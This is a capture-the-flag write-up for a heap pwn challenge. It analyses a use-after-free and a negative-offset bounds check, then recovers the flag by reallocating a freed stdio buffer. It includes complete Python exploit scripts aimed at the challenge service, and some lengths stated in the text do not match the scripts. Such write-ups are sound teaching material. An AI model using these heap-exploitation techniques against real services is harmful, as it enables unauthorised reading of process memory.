---
title: "House of Water"
category: "Pwn"
tags: ["use-after-free", "negative-offset", "stdio-buffer-reuse", "heap", "libc-leak-free"]
solve_date: "2026-10-09"
language: "en"
---

# House of Water

**Flag:** `OWASP{drink_fr0m_th3_p0is0n3d_tc4ch3}`
**Service:** `145.239.142.129:1341`. **Artifact:** `house-of-water.zip` (1072535 B), containing `chal` (17032 B), `libc.so.6` (2220400 B), `ld-linux-x86-64.so.2` (236616 B). Challenge author: Om Khanjodkar.

## Challenge

A heap menu (Hard, 500 points) with `1) malloc`, `2) free`, `3) edit`, `4) show`, `5) exit`. The program opens `./flag.txt` and reads its content inside `setup()` before entering the menu. The objective is to recover the flag string from the memory of the service process.

## Analysis

`readelf -h` returns `Type: DYN` and `r2 -q -c "iI~pic" chal` returns `pic true`; `readelf -dW` shows `FLAGS BIND_NOW` together with `GNU_RELRO` (full RELRO), `GNU_STACK` is `RW` only (NX), and the binary references `__stack_chk_fail`. `chal` is not stripped: function names (`do_malloc`, `do_free`, `do_edit`, `do_show`, `check_bounds`, `setup`) are present in the symbol table.

`setup()` (`0x130f`) calls `setvbuf` on `stdout`/`stdin`, uses `malloc(0x80)` + `memset` as the receive buffer, then `fopen("./flag.txt", "r")`, reads with `fgets` and finishes with `fclose`. Three details decide the solve:

1. `do_free` (`0x16a8`) calls `free(chunks[idx])` and sets `freed[idx] = 1` (`0x16e8`) but does **not** write `NULL` into `chunks[]` (`.bss` at `0x4040`) → every released slot stays readable and writable through `show`/`edit`: use-after-free.
2. `check_bounds` (`0x1509`) computes the lower bound from the slot state:

   ```text
   0x00001545  lea rdx, obj.freed          ; 0x4440
   0x0000154c  movzx eax, byte [rax + rdx]
   0x00001550  test al, al
   0x00001552  je 0x155d
   0x00001554  mov rax, 0xfffffffffffffff0
   0x0000155b  jmp 0x1562
   0x0000155d  mov eax, 0
   ```

   i.e. `max = freed[idx] ? -16 : 0`, and the test `offset >= max` (`0x156a`) lets a released slot take offsets down to `-16`, enough to reach the chunk header. The upper bound is `offset + length <= sizes[idx]` (`0x1587..0x15ad`), and `length` must be in `(0, 0x400]`.
3. The stdio buffer uses a `0x1000` request, corresponding to a `0x1010` chunk on glibc x86-64. This exceeds the `0x410` tcache limit. File data can remain after the free, although allocator metadata may overwrite the beginning of the chunk.

The solve relies on allocation reuse of the freed stdio buffer. This chain does not require UAF, a negative offset or tcache poisoning.

## Solution

Request exactly the size of the stdio buffer so the allocator hands that chunk back:

1. `malloc(slot 0, 0x1000)` — after `setup()` has closed the FILE, the `0x1000` request matches the buffer chunk sitting in the bin; `_int_malloc` takes/splits the chunk and does **not** overwrite the body, so the user data still holds the contents of `./flag.txt`.
2. `show(slot 0, offset 0, length 0x64)` — `do_show` prints each byte as `%02x`; `check_bounds` accepts it because the slot was never freed, so `max = 0`.

One `show` call reads the 37-byte flag from the reused buffer. Recorded reads:

```text
### slot0 +0x0 len=1024
0000 4f 57 41 53 50 7b 64 72 69 6e 6b 5f 66 72 30 6d  OWASP{drink_fr0m
...
0020 34 63 68 33 7d 0a
```

(the row at offset `0x10` lies between the two recorded rows and holds `_th3_p0is0n3d_tc`), and the 0x40-byte read from the final solve script:

```text
[2] raw: b'OWASP{drink_fr0m_th3_p0is0n3d_tc4ch3}\n\x00…'
```

(the trailing NUL bytes are abbreviated in the log).

Cross-check: with the same layout but a `malloc(0x80)` request, the allocator returns this same memory region; there the first 16 bytes carry the bin metadata (`fd`/`key`), so only the tail `_th3_p0is0n3d_tc4ch3}` is readable from offset `0x10`. The bytes from `0x10` onwards match the `0x1000` read exactly, confirming that the flag is one contiguous string inside the freed stdio buffer rather than an artefact of the read window.

## Result

```text
OWASP{drink_fr0m_th3_p0is0n3d_tc4ch3}
```

The flag was read directly from the challenge service. No submission response recorded.

## Reproduce

Requires Python 3 (`socket`, `struct`, `re`) and the service at `145.239.142.129:1341`. The two blocks below are the complete scripts; save them as `final.py` and `sweep.py` and run `python final.py` (allocates slot 0 with size `0x1000`, prints the 0x40 bytes read back and the flag) or `python sweep.py` (prints the `0x400`-byte hexdump at offsets 0, `0x400`, `0x800`, `0xc00`). The whole solve is `malloc(0, 0x1000)` followed by `show(0, 0, 0x64)`; running the binary locally against the shipped `ld-linux-x86-64.so.2`/`libc.so.6` is not required.

```python
import socket, re
s=socket.create_connection(("145.239.142.129",1341),timeout=20)
def rd(w=0.6):
    s.settimeout(w); b=b''
    try:
        while True:
            c=s.recv(4096)
            if not c: break
            b+=c
    except socket.timeout: pass
    return b
rd()
def menu(n):
    s.sendall(str(n).encode()+b'\n'); return rd()
def mk(i,sz):
    menu(1); s.sendall(b'%d\n'%i); rd(); s.sendall(b'%d\n'%sz); return rd()
def sh(i,o,l):
    menu(4); s.sendall(b'%d\n'%i); rd(); s.sendall(b'%d\n'%o); rd(); s.sendall(b'%d\n'%l); return rd()
def parse(b):
    out=b''
    for t in b.replace(b'\n',b' ').split():
        try: out+=bytes([int(t,16)])
        except ValueError: pass
    return out
print("[1]", rd_ := mk(0,0x1000))     # pop freed stdio buffer chunk (holds full flag.txt line)
d=parse(sh(0,0,0x40))
print("[2] raw:", d)
print("[3] flag:", re.search(rb'OWASP\{[^}]*\}', d).group().decode())
menu(5); s.close()
```

```python
import socket, struct, sys
H,P="145.239.142.129",1341
s=socket.create_connection((H,P),timeout=20); 
def rd(w=0.7):
    s.settimeout(w); b=b''
    try:
        while True:
            c=s.recv(4096)
            if not c: break
            b+=c
    except socket.timeout: pass
    return b
rd()
def menu(n):
    s.sendall(str(n).encode()+b'\n'); return rd()
def mk(i,sz):
    menu(1); s.sendall(b'%d\n'%i); rd(); s.sendall(b'%d\n'%sz); return rd()
def sh(i,o,l):
    menu(4); s.sendall(b'%d\n'%i); rd(); s.sendall(b'%d\n'%o); rd(); s.sendall(b'%d\n'%l); return rd()
def parse(b):
    out=b''
    for tok in b.replace(b'\n',b' ').split():
        try: out+=bytes([int(tok,16)])
        except ValueError: pass
    return out
def dump(label,b):
    d=parse(b)
    print("###",label,"len=%d"%len(d))
    for i in range(0,len(d),16):
        row=d[i:i+16]
        print("%04x  %-47s  %s"%(i," ".join("%02x"%c for c in row),"".join(chr(c) if 32<=c<127 else '.' for c in row)))
# 0x1000 chunk (candidate: old FILE read buffer)
dump("slot0 0x1000", sh0) if False else None
mk(0,0x1000)
for off in (0,0x400,0x800,0xc00):
    dump("slot0 +0x%x"%off, sh(0,off,0x400))
s.close()
```

Static checks:

```console
$ r2 -q -c "iI~pic" chal
$ r2 -q -c "aa; pd 30 @ 0x1509" chal
$ r2 -q -c "aa; pdf @ sym.do_free" chal
$ r2 -q -c "aa; pdf @ sym.setup" chal
```

`0x1554` (the `-16` constant), `0x16e8` (`freed[idx] = 1`) and the `.bss` objects at `0x4040`/`0x4240`/`0x4440` come from the shipped `chal`; `0x410` is the tcache size limit in the bundled glibc 2.35.
